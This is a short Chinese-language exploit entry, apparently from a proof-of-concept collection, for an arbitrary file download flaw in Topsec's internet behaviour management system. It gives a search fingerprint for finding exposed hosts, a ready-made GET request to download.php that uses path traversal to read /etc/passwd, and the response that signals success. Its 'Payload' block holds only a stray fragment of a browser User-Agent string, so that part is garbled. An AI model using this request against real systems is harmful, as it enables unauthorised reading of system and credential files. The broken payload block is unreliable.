# 天融信上网行为管理系统download.php存在任意文件下载漏洞

天融信上网行为管理系统 ｜ 其他 ｜ —
- **指纹**：`app="天融信-上网行为管理系统"`
- **请求**：`GET /view/systemObject/certificateAdmin/certificateLocal/download.php?name=../../../../../../..%2fetc&file=passwd HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 rootx